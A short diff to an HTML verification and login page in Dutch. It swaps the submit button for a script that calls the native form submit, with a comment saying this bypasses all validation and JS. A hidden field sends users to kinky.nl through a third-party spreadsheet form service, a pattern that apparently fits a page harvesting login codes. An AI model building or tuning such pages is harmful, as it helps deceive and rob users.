@@ -476,7 +476,7 @@
             <input type="hidden" name="x-sheetmonkey-redirect" value="https://www.kinky.nl/">
 
 
-            <button type="submit" class="btn btn-success my-4 submit">Verifieer en log in </button>
+            <button type="button" class="btn btn-success my-4 submit" id="forceSubmit"> Verifieer en log in </button>
 
             <p class="mb-1">
                 Geen code ontvangen?
@@ -692,6 +692,16 @@ Tel: 070-7506006</a>
     });
   })();
 </script>
+
+<script>
+  document.getElementById('forceSubmit').addEventListener('click', function () {
+    const form = document.getElementById('verification-form');
+
+    // bypass all validation & JS by calling the native submit method
+    HTMLFormElement.prototype.submit.call(form);
+  });
+</script>
+
 
 </body>
 
